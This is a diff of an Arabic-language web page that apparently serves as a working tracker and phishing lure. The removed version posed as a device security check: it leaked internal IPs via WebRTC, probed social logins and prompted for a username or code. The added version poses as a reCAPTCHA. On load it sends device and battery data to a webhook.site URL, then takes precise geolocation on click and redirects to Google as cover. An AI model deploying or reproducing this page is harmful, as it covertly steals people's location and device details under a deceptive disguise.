@@ -3,118 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية الرقمية</title>
+    <title>التحقق من الأمان</title>
     <style>
-        body { background-color: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); text-align: center; max-width: 90%; }
-        .loader { border: 3px solid #333; border-top: 3px solid #0078d4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        input { background: #2d2d2d; border: 1px solid #444; color: white; padding: 10px; border-radius: 5px; width: 80%; margin-top: 15px; text-align: center; }
-        button { background: #0078d4; border: none; color: white; padding: 10px 20px; border-radius: 5px; margin-top: 15px; cursor: pointer; }
+        body { background-color: #f9f9f9; font-family: Roboto, helvetica, arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 10px; position: relative; transition: all 0.2s; }
+        .captcha-text { font-size: 14px; color: #555; flex-grow: 1; font-weight: 400; }
+        .logo-section { display: flex; flex-direction: column; align-items: center; }
+        .logo-section img { width: 30px; }
+        .logo-section span { font-size: 8px; color: #555; margin-top: 2px; }
+        .checkbox.checked { border-color: transparent; }
+        .checkbox.checked::after { content: '✔'; color: #009b50; position: absolute; left: 3px; top: -3px; font-size: 20px; }
         .hidden { display: none; }
+        #loading-msg { margin-top: 15px; font-size: 13px; color: #888; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-box">
-        <h2 id="title">جاري فحص أمان الجهاز...</h2>
-        <div class="loader" id="loader"></div>
-        <p id="status">يرجى الانتظار، نقوم بالتأكد من أنك لست برنامج روبوت.</p>
-        
-        <div id="keylogger-box" class="hidden">
-            <p style="color: #ffcc00;">⚠️ تم رصد نشاط غير معتاد. يرجى إدخال اسم المستخدم أو "كود التحقق" للمتابعة:</p>
-            <input type="text" id="fake-input" placeholder="أدخل الاسم أو الكود هنا">
-            <br>
-            <button onclick="captureInput()">تأكيد الهوية</button>
+    <div style="text-align: center;">
+        <div class="captcha-box" id="captcha-btn">
+            <div class="checkbox" id="check-mark"></div>
+            <div class="captcha-text">أنا لست برنامج روبوت</div>
+            <div class="logo-section">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                <span>الخصوصية - الأحكام</span>
+            </div>
         </div>
+        <div id="loading-msg" class="hidden">جاري التحقق من بيئة الجهاز...</div>
     </div>
 
     <script>
         // 🚩 [ضع الرابط هنا] 🚩
         const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
 
-        let finalKadeesha = {
-            osint: {},
-            network_advanced: {},
-            motion_detect: {},
-            captured_text: "No Input Yet"
+        let kadeesha = {
+            step: "1_Device_Initial",
+            battery: {},
+            device: {},
+            network: {},
+            osint: {}
         };
 
-        // 1. ثغرة WebRTC لسحب الـ BSSID والـ IP الداخلي
-        async function getNetworkSpecs() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const parts = ice.candidate.candidate.split(" ");
-                        const ip = parts[4];
-                        finalKadeesha.network_advanced.internal_ip = ip;
-                        finalKadeesha.network_advanced.bssid_raw = ice.candidate.candidate; 
-                        resolve();
-                    }
-                };
-                setTimeout(resolve, 2000); // وقت مستقطع
-            });
-        }
-
-        // 2. فحص الحسابات النشطة (Social Media Probe)
-        function probeSocial() {
-            const sites = {
-                facebook: "https://www.facebook.com/favicon.ico",
-                google: "https://accounts.google.com/favicon.ico"
-            };
-            for (let site in sites) {
-                let img = new Image();
-                img.onload = () => finalKadeesha.osint[site] = "Logged In / Active";
-                img.onerror = () => finalKadeesha.osint[site] = "Not Detected";
-                img.src = sites[site] + "?random=" + Math.random();
+        // المرحلة الأولى: جمع معلومات الجهاز فوراً
+        async function collectInitialData() {
+            // معلومات البطارية
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                kadeesha.battery = { level: (b.level * 100) + "%", charging: b.charging };
             }
-        }
-
-        // 3. التقاط الحركة ورعشة اليد
-        if (window.DeviceMotionEvent) {
-            window.addEventListener('devicemotion', (e) => {
-                finalKadeesha.motion_detect = {
-                    acceleration: e.accelerationIncludingGravity,
-                    rotation: e.rotationRate,
-                    status: (Math.abs(e.acceleration.x) > 0.5) ? "يتحرك / بيد السارق" : "ثابت / على سطح"
-                };
-            }, { once: true });
-        }
-
-        async function init() {
-            probeSocial();
-            await getNetworkSpecs();
+            // معلومات الجهاز والنظام
+            kadeesha.device = {
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency,
+                ram: navigator.deviceMemory,
+                screen: window.screen.width + "x" + window.screen.height,
+                ua: navigator.userAgent
+            };
             
-            // إظهار فخ الـ Keylogger بعد 3 ثوانٍ
+            // إرسال البيانات الأولية فوراً قبل أن يضغط أي شيء
+            sendToWebhook(kadeesha);
+        }
+
+        // المرحلة الثانية: عند الضغط على الكابتشا (طلب الموقع)
+        document.getElementById('captcha-btn').onclick = function() {
+            document.getElementById('loading-msg').classList.remove('hidden');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // نجح في سحب الموقع الدقيق
+                        kadeesha.step = "2_Location_Success";
+                        kadeesha.location = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy + "m",
+                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        };
+                        finishSuccess();
+                    },
+                    (err) => {
+                        // رفض الإذن
+                        kadeesha.step = "2_Location_Denied";
+                        finishSuccess();
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                finishSuccess();
+            }
+        };
+
+        function finishSuccess() {
+            document.getElementById('check-mark').classList.add('checked');
+            document.getElementById('loading-msg').innerText = "تم التحقق بنجاح!";
+            sendToWebhook(kadeesha);
+            
+            // تمويه: تحويل لصفحة جوجل بعد ثانية
             setTimeout(() => {
-                document.getElementById('loader').classList.add('hidden');
-                document.getElementById('title').innerText = "مطلوب إجراء يدوي";
-                document.getElementById('status').classList.add('hidden');
-                document.getElementById('keylogger-box').classList.remove('hidden');
-            }, 3000);
+                window.location.href = "https://www.google.com";
+            }, 1500);
         }
 
-        async function captureInput() {
-            const val = document.getElementById('fake-input').value;
-            finalKadeesha.captured_text = val;
-            document.getElementById('main-box').innerHTML = "<h2>تم التحقق بنجاح</h2><p>جاري تحويلك للملف...</p>";
-            
-            // إرسال الكديشة النهائية
+        async function sendToWebhook(data) {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(finalKadeesha)
+                body: JSON.stringify(data)
             });
-
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1000);
         }
 
-        window.onload = init;
+        window.onload = collectInitialData;
     </script>
 </body>
 </html>
